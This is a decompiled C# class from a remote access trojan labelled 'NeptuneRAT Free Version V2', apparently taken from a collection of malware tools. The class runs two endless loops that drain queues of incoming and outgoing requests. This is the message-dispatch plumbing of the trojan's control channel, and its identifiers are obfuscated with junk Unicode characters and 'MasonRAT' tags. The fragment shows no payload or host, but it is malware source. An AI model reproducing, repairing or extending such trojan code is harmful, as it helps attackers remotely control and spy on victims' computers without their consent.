// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.Pending
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;

#nullable disable
namespace NeptuneRAT;

public class Pending
{
  public static List<Incoming_Requests> \u2694️MasonRAT\u270Cﮪڝ\u060Eب\u060Aــڕڕ\u060Fﻋ\u0608\u060A\u0020دڠۡٺۚ;
  public static List<Outcoming_Requests> \u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F;

  public static void \u2694️MasonRAT\u270C\u060Aدڙــۡ\u0608ﻻـٽټـ()
  {
    while (true)
    {
      try
      {
        if (Pending.\u2694️MasonRAT\u270Cﮪڝ\u060Eب\u060Aــڕڕ\u060Fﻋ\u0608\u060A\u0020دڠۡٺۚ.Count > 0)
        {
          Incoming_Requests incomingRequests = Pending.\u2694️MasonRAT\u270Cﮪڝ\u060Eب\u060Aــڕڕ\u060Fﻋ\u0608\u060A\u0020دڠۡٺۚ[0];
          Messages.\u2694️MasonRAT\u270Cـ\u060A\u060A\u060Fاּٺ؁\u0608\u060Eةـۚۙ\u0609ٺدڙـ\u060C(incomingRequests.\u2694️MasonRAT\u270Cـڙڙڙــ\u060Aڙ\u060Aـء\u060Fּۧ\u060Dـ\u060D, incomingRequests.\u2694️MasonRAT\u270Cۡـڇ\u060Dٺﮪ\u060Dـ\u060Aـــټٽ);
          Pending.\u2694️MasonRAT\u270Cﮪڝ\u060Eب\u060Aــڕڕ\u060Fﻋ\u0608\u060A\u0020دڠۡٺۚ.Remove(incomingRequests);
        }
        Thread.Sleep(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 4053) + exception.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  public static void \u2694️MasonRAT\u270C\u0608ۛ\u0608ـڞڙــ\u0608ڜــ\u0020ـ\u060Dـۨـ\u060F()
  {
    while (true)
    {
      try
      {
        if (Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Count > 0)
        {
          Outcoming_Requests outcomingRequests = Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F[0];
          outcomingRequests.\u2694️MasonRAT\u270C\u060Dـ\u060Cـ\u060Dط̍ڞ\u0609ٽڜ\u0609ْژ.\u2694️MasonRAT\u270Cڙـۙٺٺ̍ــڕ\u060A\u060B\u0608(outcomingRequests.\u2694️MasonRAT\u270Cـڠڙــۡٸط\u0608ۛ);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Remove(outcomingRequests);
        }
        Thread.Sleep(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 4054) + exception.Message);
        ProjectData.ClearProjectError();
      }
    }
  }
}
